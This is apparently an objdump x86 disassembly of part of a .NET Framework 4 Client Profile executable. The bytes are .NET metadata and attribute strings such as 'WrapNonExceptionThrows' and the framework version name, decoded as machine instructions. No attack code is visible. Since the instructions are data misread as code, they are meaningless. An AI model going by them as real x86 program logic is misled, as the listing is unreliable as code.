  40c93f:	03 20                	add    (%eax),%esp
  40c941:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c944:	20 00                	and    %al,(%eax)
  40c946:	02 03                	add    (%ebx),%al
  40c948:	28 00                	sub    %al,(%eax)
  40c94a:	1c 03                	sbb    $0x3,%al
  40c94c:	06                   	push   %es
  40c94d:	12 60 0b             	adc    0xb(%eax),%ah
  40c950:	20 02                	and    %al,(%edx)
  40c952:	01 12                	add    %edx,(%edx)
  40c954:	60                   	pusha
  40c955:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c95a:	60                   	pusha
  40c95b:	04 20                	add    $0x20,%al
  40c95d:	00 12                	add    %dl,(%edx)
  40c95f:	60                   	pusha
  40c960:	05 20 01 12 60       	add    $0x60120120,%eax
  40c965:	0e                   	push   %cs
  40c966:	05 20 01 12 60       	add    $0x60120120,%eax
  40c96b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c971:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c976:	60                   	pusha
  40c977:	08 03                	or     %al,(%ebx)
  40c979:	20 00                	and    %al,(%eax)
  40c97b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c981:	08 03                	or     %al,(%ebx)
  40c983:	28 00                	sub    %al,(%eax)
  40c985:	08 03                	or     %al,(%ebx)
  40c987:	06                   	push   %es
  40c988:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c98c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c990:	01 08                	add    %ecx,(%eax)
  40c992:	0e                   	push   %cs
  40c993:	05 20 01 01 12       	add    $0x12010120,%eax
  40c998:	61                   	popa
  40c999:	04 20                	add    $0x20,%al
  40c99b:	01 01                	add    %eax,(%ecx)
  40c99d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9a0:	01 01                	add    %eax,(%ecx)
  40c9a2:	0b 03                	or     (%ebx),%eax
  40c9a4:	20 00                	and    %al,(%eax)
  40c9a6:	0b 03                	or     (%ebx),%eax
  40c9a8:	20 00                	and    %al,(%eax)
  40c9aa:	0a 03                	or     (%ebx),%al
  40c9ac:	20 00                	and    %al,(%eax)
  40c9ae:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9b3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9b8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9bd:	01 0e                	add    %ecx,(%esi)
  40c9bf:	0e                   	push   %cs
  40c9c0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9c5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9c8:	01 02                	add    %eax,(%edx)
  40c9ca:	0e                   	push   %cs
  40c9cb:	03 20                	add    (%eax),%esp
  40c9cd:	00 0e                	add    %cl,(%esi)
  40c9cf:	04 20                	add    $0x20,%al
  40c9d1:	01 01                	add    %eax,(%ecx)
  40c9d3:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9d6:	01 01                	add    %eax,(%ecx)
  40c9d8:	0c 04                	or     $0x4,%al
  40c9da:	20 01                	and    %al,(%ecx)
  40c9dc:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9e2:	5c                   	pop    %esp
  40c9e3:	04 20                	add    $0x20,%al
  40c9e5:	00 11                	add    %dl,(%ecx)
  40c9e7:	64 04 20             	fs add $0x20,%al
  40c9ea:	00 12                	add    %dl,(%edx)
  40c9ec:	59                   	pop    %ecx
  40c9ed:	03 28                	add    (%eax),%ebp
  40c9ef:	00 0e                	add    %cl,(%esi)
  40c9f1:	03 28                	add    (%eax),%ebp
  40c9f3:	00 0a                	add    %cl,(%edx)
  40c9f5:	03 28                	add    (%eax),%ebp
  40c9f7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9fd:	5c                   	pop    %esp
  40c9fe:	04 28                	add    $0x28,%al
  40ca00:	00 11                	add    %dl,(%ecx)
  40ca02:	64 04 00             	fs add $0x0,%al
  40ca05:	00 00                	add    %al,(%eax)
  40ca07:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca0a:	00 00                	add    %al,(%eax)
  40ca0c:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca0f:	00 00                	add    %al,(%eax)
  40ca11:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca18:	06                   	push   %es
  40ca19:	00 00                	add    %al,(%eax)
  40ca1b:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca1e:	00 00                	add    %al,(%eax)
  40ca20:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca23:	00 00                	add    %al,(%eax)
  40ca25:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca28:	00 00                	add    %al,(%eax)
  40ca2a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca2d:	00 00                	add    %al,(%eax)
  40ca2f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca32:	00 00                	add    %al,(%eax)
  40ca34:	00 06                	add    %al,(%esi)
  40ca36:	00 02                	add    %al,(%edx)
  40ca38:	0e                   	push   %cs
  40ca39:	12 61 08             	adc    0x8(%ecx),%ah
  40ca3c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca41:	61                   	popa
  40ca42:	06                   	push   %es
  40ca43:	00 02                	add    %al,(%edx)
  40ca45:	0e                   	push   %cs
  40ca46:	05 12 61 05 00       	add    $0x56112,%eax
  40ca4b:	01 01                	add    %eax,(%ecx)
  40ca4d:	12 61 06             	adc    0x6(%ecx),%ah
  40ca50:	00 02                	add    %al,(%edx)
  40ca52:	01 12                	add    %edx,(%edx)
  40ca54:	61                   	popa
  40ca55:	0e                   	push   %cs
  40ca56:	07                   	pop    %es
  40ca57:	00 02                	add    %al,(%edx)
  40ca59:	01 12                	add    %edx,(%edx)
  40ca5b:	61                   	popa
  40ca5c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca61:	01 12                	add    %edx,(%edx)
  40ca63:	61                   	popa
  40ca64:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca69:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca6c:	06                   	push   %es
  40ca6d:	00 02                	add    %al,(%edx)
  40ca6f:	01 12                	add    %edx,(%edx)
  40ca71:	61                   	popa
  40ca72:	02 06                	add    (%esi),%al
  40ca74:	00 02                	add    %al,(%edx)
  40ca76:	01 12                	add    %edx,(%edx)
  40ca78:	61                   	popa
  40ca79:	0b 06                	or     (%esi),%eax
  40ca7b:	00 02                	add    %al,(%edx)
  40ca7d:	01 12                	add    %edx,(%edx)
  40ca7f:	61                   	popa
  40ca80:	0a 03                	or     (%ebx),%al
  40ca82:	06                   	push   %es
  40ca83:	11 78 04             	adc    %edi,0x4(%eax)
  40ca86:	20 01                	and    %al,(%ecx)
  40ca88:	01 08                	add    %ecx,(%eax)
  40ca8a:	08 01                	or     %al,(%ecx)
  40ca8c:	00 08                	add    %cl,(%eax)
  40ca8e:	00 00                	add    %al,(%eax)
  40ca90:	00 00                	add    %al,(%eax)
  40ca92:	00 1e                	add    %bl,(%esi)
  40ca94:	01 00                	add    %eax,(%eax)
  40ca96:	01 00                	add    %eax,(%eax)
  40ca98:	54                   	push   %esp
  40ca99:	02 16                	add    (%esi),%dl
  40ca9b:	57                   	push   %edi
  40ca9c:	72 61                	jb     0x40caff
  40ca9e:	70 4e                	jo     0x40caee
  40caa0:	6f                   	outsl  %ds:(%esi),(%dx)
  40caa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40caa2:	45                   	inc    %ebp
  40caa3:	78 63                	js     0x40cb08
  40caa5:	65 70 74             	gs jo  0x40cb1c
  40caa8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40caaf:	77 73                	ja     0x40cb24
  40cab1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cab7:	71 08                	jno    0x40cac1
  40cab9:	01 00                	add    %eax,(%eax)
  40cabb:	02 00                	add    (%eax),%al
  40cabd:	00 00                	add    %al,(%eax)
  40cabf:	00 00                	add    %al,(%eax)
  40cac1:	05 01 00 00 00       	add    $0x1,%eax
  40cac6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cac9:	00 07                	add    %al,(%edi)
  40cacb:	31 2e                	xor    %ebp,(%esi)
  40cacd:	30 2e                	xor    %ch,(%esi)
  40cacf:	30 2e                	xor    %ch,(%esi)
  40cad1:	30 00                	xor    %al,(%eax)
  40cad3:	00 65 01             	add    %ah,0x1(%ebp)
  40cad6:	00 29                	add    %ch,(%ecx)
  40cad8:	2e 4e                	cs dec %esi
  40cada:	45                   	inc    %ebp
  40cadb:	54                   	push   %esp
  40cadc:	46                   	inc    %esi
  40cadd:	72 61                	jb     0x40cb40
  40cadf:	6d                   	insl   (%dx),%es:(%edi)
  40cae0:	65 77 6f             	gs ja  0x40cb52
  40cae3:	72 6b                	jb     0x40cb50
  40cae5:	2c 56                	sub    $0x56,%al
  40cae7:	65 72 73             	gs jb  0x40cb5d
  40caea:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40caf1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40caf4:	72 6f                	jb     0x40cb65
  40caf6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cafd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb04:	0e                   	push   %cs
  40cb05:	14 46                	adc    $0x46,%al
  40cb07:	72 61                	jb     0x40cb6a
  40cb09:	6d                   	insl   (%dx),%es:(%edi)
  40cb0a:	65 77 6f             	gs ja  0x40cb7c
  40cb0d:	72 6b                	jb     0x40cb7a
  40cb0f:	44                   	inc    %esp
  40cb10:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb17:	61                   	popa
  40cb18:	6d                   	insl   (%dx),%es:(%edi)
  40cb19:	65 1f                	gs pop %ds
  40cb1b:	2e 4e                	cs dec %esi
  40cb1d:	45                   	inc    %ebp
  40cb1e:	54                   	push   %esp
  40cb1f:	20 46 72             	and    %al,0x72(%esi)
  40cb22:	61                   	popa
  40cb23:	6d                   	insl   (%dx),%es:(%edi)
  40cb24:	65 77 6f             	gs ja  0x40cb96
  40cb27:	72 6b                	jb     0x40cb94
  40cb29:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb2c:	43                   	inc    %ebx
  40cb2d:	6c                   	insb   (%dx),%es:(%edi)
  40cb2e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb35:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb36:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb3d:	04 49                	add    $0x49,%al
  40cb3f:	74 65                	je     0x40cba6
  40cb41:	6d                   	insl   (%dx),%es:(%edi)
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	03 07                	add    (%edi),%eax
  40cb46:	01 08                	add    %ecx,(%eax)
  40cb48:	04 00                	add    $0x0,%al
  40cb4a:	01 08                	add    %ecx,(%eax)
  40cb4c:	0e                   	push   %cs
  40cb4d:	03 07                	add    (%edi),%eax
  40cb4f:	01 02                	add    %eax,(%edx)
  40cb51:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb56:	b1 05                	mov    $0x5,%cl
  40cb58:	20 01                	and    %al,(%ecx)
  40cb5a:	0e                   	push   %cs
  40cb5b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb60:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb66:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb6c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb71:	03 02                	add    (%edx),%eax
  40cb73:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb78:	14 07                	adc    $0x7,%al
  40cb7a:	08 0e                	or     %cl,(%esi)
  40cb7c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb82:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb88:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb8e:	20 03                	and    %al,(%ebx)
  40cb90:	01 11                	add    %edx,(%ecx)
  40cb92:	80 d5 11             	adc    $0x11,%ch
  40cb95:	80 d9 11             	sbb    $0x11,%cl
  40cb98:	80 dd 05             	sbb    $0x5,%ch
  40cb9b:	00 02                	add    %al,(%edx)
  40cb9d:	02 0e                	add    (%esi),%cl
  40cb9f:	0e                   	push   %cs
  40cba0:	06                   	push   %es
  40cba1:	20 01                	and    %al,(%ecx)
  40cba3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cba8:	20 01                	and    %al,(%ecx)
  40cbaa:	08 08                	or     %cl,(%eax)
  40cbac:	07                   	pop    %es
  40cbad:	00 01                	add    %al,(%ecx)
  40cbaf:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbb4:	07                   	pop    %es
  40cbb5:	20 02                	and    %al,(%edx)
  40cbb7:	01 12                	add    %edx,(%edx)
  40cbb9:	80 c9 08             	or     $0x8,%cl
  40cbbc:	06                   	push   %es
  40cbbd:	20 01                	and    %al,(%ecx)
  40cbbf:	01 12                	add    %edx,(%edx)
  40cbc1:	80 f1 09             	xor    $0x9,%cl
  40cbc4:	20 02                	and    %al,(%edx)
  40cbc6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbcb:	80 f5 05             	xor    $0x5,%ch
  40cbce:	20 02                	and    %al,(%edx)
  40cbd0:	08 08                	or     %cl,(%eax)
  40cbd2:	08 06                	or     %al,(%esi)
  40cbd4:	20 02                	and    %al,(%edx)
  40cbd6:	01 12                	add    %edx,(%edx)
  40cbd8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbdd:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbe0:	09 20                	or     %esp,(%eax)
  40cbe2:	03 01                	add    (%ecx),%eax
  40cbe4:	12 61 02             	adc    0x2(%ecx),%ah
  40cbe7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbed:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbf3:	01 0e                	add    %ecx,(%esi)
  40cbf5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbfb:	02 09                	add    (%ecx),%cl
  40cbfd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc00:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc06:	0c 20                	or     $0x20,%al
  40cc08:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc0d:	08 08                	or     %cl,(%eax)
  40cc0f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc15:	01 11                	add    %edx,(%ecx)
  40cc17:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc1d:	02 12                	add    (%edx),%dl
  40cc1f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc22:	02 08                	add    (%eax),%cl
  40cc24:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc2a:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc2f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc34:	03 08                	add    (%eax),%ecx
  40cc36:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc3b:	20 01                	and    %al,(%ecx)
  40cc3d:	01 12                	add    %edx,(%edx)
  40cc3f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc45:	1c 0c                	sbb    $0xc,%al
  40cc47:	07                   	pop    %es
  40cc48:	06                   	push   %es
  40cc49:	1c 02                	sbb    $0x2,%al
  40cc4b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc50:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc56:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc59:	02 07                	add    (%edi),%al
  40cc5b:	20 02                	and    %al,(%edx)
  40cc5d:	02 08                	add    (%eax),%cl
  40cc5f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc65:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc6b:	07                   	pop    %es
  40cc6c:	0a 12                	or     (%edx),%dl
  40cc6e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc75:	08 12 81 
  40cc78:	41                   	inc    %ecx
  40cc79:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc7f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc84:	4d                   	dec    %ebp
  40cc85:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc8a:	0e                   	push   %cs
  40cc8b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc90:	41                   	inc    %ecx
  40cc91:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc96:	55                   	push   %ebp
  40cc97:	06                   	push   %es
  40cc98:	00 00                	add    %al,(%eax)
  40cc9a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc9f:	00 01                	add    %al,(%ecx)
  40cca1:	0e                   	push   %cs
  40cca2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cca7:	01 11                	add    %edx,(%ecx)
  40cca9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccb0:	41                   	inc    %ecx
  40ccb1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccb7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccbe:	49                   	dec    %ecx
  40ccbf:	0e                   	push   %cs
  40ccc0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccc6:	0e                   	push   %cs
  40ccc7:	0e                   	push   %cs
  40ccc8:	0e                   	push   %cs
  40ccc9:	0e                   	push   %cs
  40ccca:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cccf:	1c 07                	sbb    $0x7,%al
  40ccd1:	20 02                	and    %al,(%edx)
  40ccd3:	01 0e                	add    %ecx,(%esi)
  40ccd5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccdb:	0a 02                	or     (%edx),%al
  40ccdd:	10 07                	adc    %al,(%edi)
  40ccdf:	06                   	push   %es
  40cce0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cce6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccec:	0e                   	push   %cs
  40cced:	02 05 20 00 12 81    	add    0x81120020,%al
  40ccf3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40ccf9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40ccff:	91                   	xchg   %eax,%ecx
  40cd00:	04 20                	add    $0x20,%al
  40cd02:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd05:	04 07                	add    $0x7,%al
  40cd07:	02 02                	add    (%edx),%al
  40cd09:	02 03                	add    (%ebx),%al
  40cd0b:	20 00                	and    %al,(%eax)
  40cd0d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd10:	02 18                	add    (%eax),%bl
  40cd12:	02 03                	add    (%ebx),%al
  40cd14:	07                   	pop    %es
  40cd15:	01 0e                	add    %ecx,(%esi)
  40cd17:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd1c:	9d                   	popf
  40cd1d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd22:	1c 0a                	sbb    $0xa,%al
  40cd24:	07                   	pop    %es
  40cd25:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd2a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd2f:	20 01                	and    %al,(%ecx)
  40cd31:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd37:	0e                   	push   %cs
  40cd38:	08 08                	or     %cl,(%eax)
  40cd3a:	06                   	push   %es
  40cd3b:	07                   	pop    %es
  40cd3c:	02 02                	add    (%edx),%al
  40cd3e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd44:	0e                   	push   %cs
  40cd45:	0e                   	push   %cs
  40cd46:	0e                   	push   %cs
  40cd47:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd4c:	ad                   	lods   %ds:(%esi),%eax
  40cd4d:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd52:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd57:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd5d:	02 11                	add    (%ecx),%dl
  40cd5f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd65:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd6c:	12 81 8d 
  40cd6f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd75:	12 41 01             	adc    0x1(%ecx),%al
  40cd78:	0e                   	push   %cs
  40cd79:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd7e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd84:	00 06                	add    %al,(%esi)
  40cd86:	00 02                	add    %al,(%edx)
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd8f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd94:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd9a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cda0:	c5 09                	lds    (%ecx),%ecx
  40cda2:	00 02                	add    %al,(%edx)
  40cda4:	02 11                	add    (%ecx),%dl
  40cda6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdac:	07                   	pop    %es
  40cdad:	02 12                	add    (%edx),%dl
  40cdaf:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdb4:	01 02                	add    %eax,(%edx)
  40cdb6:	0e                   	push   %cs
  40cdb7:	10 02                	adc    %al,(%edx)
  40cdb9:	06                   	push   %es
  40cdba:	00 01                	add    %al,(%ecx)
  40cdbc:	01 12                	add    %edx,(%edx)
  40cdbe:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdc4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cdcb:	0e                   	push   %cs
  40cdcc:	1c 11                	sbb    $0x11,%al
  40cdce:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdd4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cddb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cde1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cde6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cded:	12 60 0e             	adc    0xe(%eax),%ah
  40cdf0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdf5:	12 60 12             	adc    0x12(%eax),%ah
  40cdf8:	60                   	pusha
  40cdf9:	06                   	push   %es
  40cdfa:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cdff:	60                   	pusha
  40ce00:	10 10                	adc    %dl,(%eax)
  40ce02:	01 01                	add    %eax,(%ecx)
  40ce04:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce09:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce0f:	1e                   	push   %ds
  40ce10:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce13:	01 12                	add    %edx,(%edx)
  40ce15:	60                   	pusha
  40ce16:	09 20                	or     %esp,(%eax)
  40ce18:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce1e:	13 00                	adc    (%eax),%eax
  40ce20:	07                   	pop    %es
  40ce21:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce26:	12 60 04             	adc    0x4(%eax),%ah
  40ce29:	20 00                	and    %al,(%eax)
  40ce2b:	13 00                	adc    (%eax),%eax
  40ce2d:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce32:	00 03                	add    %al,(%ebx)
  40ce34:	07                   	pop    %es
  40ce35:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce3c:	e5 07                	in     $0x7,%eax
  40ce3e:	20 01                	and    %al,(%ecx)
  40ce40:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce46:	20 01                	and    %al,(%ecx)
  40ce48:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce4e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce51:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce57:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce5d:	00 02                	add    %al,(%edx)
  40ce5f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce65:	0e                   	push   %cs
  40ce66:	1c 00                	sbb    $0x0,%al
  40ce68:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce6d:	82 09 0e             	orb    $0xe,(%ecx)
  40ce70:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce75:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce7b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce80:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce86:	45                   	inc    %ebp
  40ce87:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce8d:	4d                   	dec    %ebp
  40ce8e:	1c 12                	sbb    $0x12,%al
  40ce90:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce95:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce9a:	0e                   	push   %cs
  40ce9b:	0b 00                	or     (%eax),%eax
  40ce9d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cea3:	00 12                	add    %dl,(%edx)
  40cea5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ceac:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ceb1:	4d                   	dec    %ebp
  40ceb2:	1c 12                	sbb    $0x12,%al
  40ceb4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ceb9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cebe:	0e                   	push   %cs
  40cebf:	17                   	pop    %ss
  40cec0:	20 0a                	and    %cl,(%edx)
  40cec2:	01 13                	add    %edx,(%ebx)
  40cec4:	00 13                	add    %dl,(%ebx)
  40cec6:	01 13                	add    %edx,(%ebx)
  40cec8:	02 13                	add    (%ebx),%dl
  40ceca:	03 13                	add    (%ebx),%edx
  40cecc:	04 13                	add    $0x13,%al
  40cece:	05 13 06 13 07       	add    $0x7130613,%eax
  40ced3:	13 08                	adc    (%eax),%ecx
  40ced5:	13 09                	adc    (%ecx),%ecx
  40ced7:	05 07 01 12 82       	add    $0x82120107,%eax
  40cedc:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cee1:	0e                   	push   %cs
  40cee2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cee7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ceed:	06                   	push   %es
  40ceee:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cef4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cefa:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ceff:	20 01                	and    %al,(%ecx)
  40cf01:	01 11                	add    %edx,(%ecx)
  40cf03:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf0a:	82 31 05             	xorb   $0x5,(%ecx)
  40cf0d:	20 00                	and    %al,(%eax)
  40cf0f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf15:	01 12                	add    %edx,(%edx)
  40cf17:	61                   	popa
  40cf18:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf1e:	08 20                	or     %ah,(%eax)
  40cf20:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf26:	08 1a                	or     %bl,(%edx)
  40cf28:	07                   	pop    %es
  40cf29:	0a 12                	or     (%edx),%dl
  40cf2b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf32:	21 1d 05 
  40cf35:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf3a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf41:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf46:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf4c:	45                   	inc    %ebp
  40cf4d:	08 08                	or     %cl,(%eax)
  40cf4f:	04 07                	add    $0x7,%al
  40cf51:	02 02                	add    (%edx),%al
  40cf53:	08 09                	or     %cl,(%ecx)
  40cf55:	00 02                	add    %al,(%edx)
  40cf57:	01 12                	add    %edx,(%edx)
  40cf59:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf5d:	4d                   	dec    %ebp
  40cf5e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf63:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf69:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf6e:	02 12                	add    (%edx),%dl
  40cf70:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf74:	08 07                	or     %al,(%edi)
  40cf76:	04 12                	add    $0x12,%al
  40cf78:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf7d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf82:	1c 06                	sbb    $0x6,%al
  40cf84:	07                   	pop    %es
  40cf85:	03 1d 05 08 08 05    	add    0x5080805,%ebx
